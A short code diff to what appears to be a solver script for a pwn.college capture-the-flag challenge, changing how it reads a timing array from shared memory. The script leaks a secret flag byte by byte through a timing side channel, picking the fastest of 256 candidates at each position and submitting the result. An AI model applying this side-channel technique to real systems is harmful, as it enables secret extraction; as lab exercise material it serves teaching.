@@ -18,8 +18,10 @@ from dojotool import find_challenge, submit, tee
 def inside_challenge() -> None:
     SHM = 0x1337000
     index = ctypes.c_int.from_address(SHM + 32)
-    timings = (ctypes.c_uint64 * 256).from_address(SHM + 0x1000)
     sem_post = ctypes.CDLL(None).sem_post
+
+    def get_timing(i: int) -> int:
+        return (ctypes.c_uint64 * 256).from_address(SHM + 0x1000)[i]
 
     flag = bytearray()
     for pos in range(64):
@@ -27,7 +29,7 @@ def inside_challenge() -> None:
         sem_post(SHM)
         time.sleep(0.001)
 
-        leaked = min(range(256), key=lambda i: timings[i])
+        leaked = min(range(256), key=get_timing)
         flag.append(leaked)
         print(f"[{pos:2d}] 0x{leaked:02x} '{chr(leaked)}'", flush=True)
         if leaked == ord("}"):
@@ -36,7 +38,6 @@ def inside_challenge() -> None:
     flag = flag.decode()
     if "pwn.college" in flag:
         submit(flag)
-
 
     # 让父进程退出
     sem_post(SHM)
